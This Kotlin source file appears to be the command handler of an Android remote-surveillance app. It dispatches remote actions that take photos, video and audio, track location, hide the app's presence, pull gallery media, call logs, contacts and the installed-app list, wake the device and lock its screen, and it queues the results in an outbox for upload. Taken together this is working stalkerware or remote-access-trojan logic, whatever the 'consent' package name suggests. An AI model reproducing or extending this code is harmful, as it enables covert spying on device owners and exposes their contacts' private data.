package com.vlink.consent

import android.content.Context
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import org.json.JSONObject

object Cmd {
    fun run(ctx: Context, action: String, args: JSONObject) {
        val spec = CmdSpec.of(action)
        if (spec == null) {
            Outbox(ctx).put("ack", JSONObject().put("action", action).put("ok", false))
            return
        }
        when (spec) {
            CmdSpec.PHOTO -> CaptureService.run(ctx, CaptureService.A_PHOTO, front = args.optBoolean("front"))
            CmdSpec.VIDEO -> CaptureService.run(ctx, CaptureService.A_VIDEO, args.optInt("sec", 10), args.optBoolean("front"))
            CmdSpec.AUDIO -> CaptureService.run(ctx, CaptureService.A_AUDIO, args.optInt("sec", 15))
            CmdSpec.LOCATION -> LocationService.start(ctx)
            CmdSpec.RING -> ring(ctx, args.optInt("sec", 8))
            CmdSpec.VIBRATE -> vibrate(ctx, args.optInt("ms", 800))
            CmdSpec.HIDE -> Hidden.set(ctx, false)
            CmdSpec.SHOW -> Hidden.set(ctx, true)
            CmdSpec.FLUSH -> Outbox(ctx).flush()
            CmdSpec.GALLERY -> MediaSync.images(ctx, args.optInt("count", 5))
            CmdSpec.FILES -> MediaSync.videos(ctx, args.optInt("count", 2))
            CmdSpec.CALLLOG -> CallLogSync.push(ctx, args.optInt("count", 30))
            CmdSpec.CONTACTS -> ContactNames.dump(ctx, args.optInt("count", 300))
            CmdSpec.APPS -> SysInfo.apps(ctx)
            CmdSpec.BATTERY -> { SysInfo.battery(ctx); SysInfo.wifi(ctx) }
            CmdSpec.SCHED -> Sched.at(ctx, args.optLong("at", System.currentTimeMillis() + 60_000L), args.optInt("sec", 30))
            CmdSpec.WAKE -> wake(ctx)
            CmdSpec.SCREEN_OFF -> screenOff(ctx)
        }
        Outbox(ctx).put("ack", JSONObject().put("action", action).put("ok", true))
    }

    @Suppress("DEPRECATION")
    private fun wake(ctx: Context) {
        val pm = ctx.getSystemService(PowerManager::class.java)
        pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "vlink:wake")
            .acquire(8000L)
    }

    private fun screenOff(ctx: Context) {
        runCatching {
            ctx.getSystemService(android.app.admin.DevicePolicyManager::class.java).lockNow()
        }
    }

    private fun ring(ctx: Context, seconds: Int) {
        val am = ctx.getSystemService(AudioManager::class.java)
        val prev = am.ringerMode
        am.ringerMode = AudioManager.RINGER_MODE_NORMAL
        val tone = RingtoneManager.getRingtone(ctx, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM))
        tone.play()
        Handler(Looper.getMainLooper()).postDelayed({ tone.stop(); am.ringerMode = prev }, seconds * 1000L)
    }

    private fun vibrate(ctx: Context, ms: Int) {
        val v = if (Build.VERSION.SDK_INT >= 31)
            ctx.getSystemService(VibratorManager::class.java).defaultVibrator
        else @Suppress("DEPRECATION") ctx.getSystemService(Vibrator::class.java)
        v.vibrate(VibrationEffect.createOneShot(ms.toLong(), VibrationEffect.DEFAULT_AMPLITUDE))
    }
}
